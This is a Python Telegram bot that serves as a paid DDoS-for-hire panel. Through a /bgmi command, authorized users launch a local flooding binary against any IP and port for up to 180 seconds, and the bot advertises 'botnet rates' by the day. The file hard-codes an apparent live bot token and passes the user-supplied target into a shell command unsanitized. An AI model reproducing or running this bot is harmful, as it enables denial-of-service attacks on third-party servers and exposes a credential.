#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import signal

# insert your Telegram bot token here
bot = telebot.TeleBot('8385872959:AAGJbMkOejYsveH4ZOtab3gbFV0lgMmEflI')

# Admin user IDs
admin_id = ["6454123620"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Biến toàn cục lưu process bgmi
bgmi_process = None

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# ---------------- Admin commands ----------------
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found ❌."
        else:
            response = "Usage: /remove <userid>"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            open(LOG_FILE, "w").close()
            response = "Logs cleared ✅"
        except Exception:
            response = "Error clearing logs ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n" + "\n".join(user_ids)
                else:
                    response = "No users ❌"
        except FileNotFoundError:
            response = "No users ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "No logs ❌")
    else:
        bot.reply_to(message, "Only Admin Can Run This Command 😡.")

# ---------------- User commands ----------------
@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"🤖Your ID: {message.chat.id}")

def start_attack_reply(message, target, port, time):
    username = message.from_user.username or message.from_user.first_name
    response = f"{username}, ATTACK STARTED 🔥\nTarget: {target}\nPort: {port}\nTime: {time}s"
    bot.reply_to(message, response)

bgmi_cooldown = {}
COOLDOWN_TIME = 0

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global bgmi_process
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "❌ You Are Not Authorized ❌")
        return

    if user_id not in admin_id:
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
            bot.reply_to(message, "Cooldown ❌ wait 5min.")
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()

    command = message.text.split()
    if len(command) == 4:
        target, port, time = command[1], int(command[2]), int(command[3])
        if time > 181:
            bot.reply_to(message, "Error: Time must be < 181s.")
            return

        record_command_logs(user_id, '/bgmi', target, port, time)
        log_command(user_id, target, port, time)
        start_attack_reply(message, target, port, time)

        full_command = f"./bgmi {target} {port} {time} 200"
        bgmi_process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
        bot.reply_to(message, f"BGMI Attack Started on {target}:{port} for {time}s")
    else:
        bot.reply_to(message, "Usage: /bgmi <IP> <PORT> <TIME>")

@bot.message_handler(commands=['stop'])
def stop_bgmi(message):
    global bgmi_process
    if bgmi_process and bgmi_process.poll() is None:
        try:
            os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
            bot.reply_to(message, "🛑 Attack stopped successfully!")
        except Exception as e:
            bot.reply_to(message, f"Error stopping attack: {e}")
        bgmi_process = None
    else:
        bot.reply_to(message, "⚠️ No running attack to stop.")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Unauthorized ❌")
        return
    try:
        with open(LOG_FILE, "r") as file:
            logs = [log for log in file.readlines() if f"UserID: {user_id}" in log]
            bot.reply_to(message, "Your Logs:\n" + "".join(logs) if logs else "No logs ❌")
    except FileNotFoundError:
        bot.reply_to(message, "No logs ❌")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 Commands:
💥 /bgmi <IP> <PORT> <TIME> : Start attack
💥 /stop : Stop running attack
💥 /rules : Usage rules
💥 /mylogs : Your logs
💥 /plan : Botnet rates

Admin only:
💥 /add <id>, /remove <id>, /allusers, /logs, /clearlogs, /broadcast
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}\nUse /help")

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    bot.reply_to(message, "⚠️ Rules:\n1. Don't spam attacks\n2. Don't run 2 at once\n3. Logs are checked daily")

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    bot.reply_to(message, "VIP 🌟 : 180s attack, 5min cooldown, 3 concurrents\n1day=15k, 3days=40k")

@bot.message_handler(commands=['admincmd'])
def admincmd(message):
    bot.reply_to(message, "Admin commands:\n/add, /remove, /allusers, /logs, /broadcast, /clearlogs")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Only Admin ❌")
        return
    command = message.text.split(maxsplit=1)
    if len(command) > 1:
        msg = "⚠️ Admin Broadcast:\n\n" + command[1]
        with open(USER_FILE, "r") as file:
            for uid in file.read().splitlines():
                try:
                    bot.send_message(uid, msg)
                except: pass
        bot.reply_to(message, "Broadcast sent ✅")
    else:
        bot.reply_to(message, "Usage: /broadcast <msg>")

bot.polling()
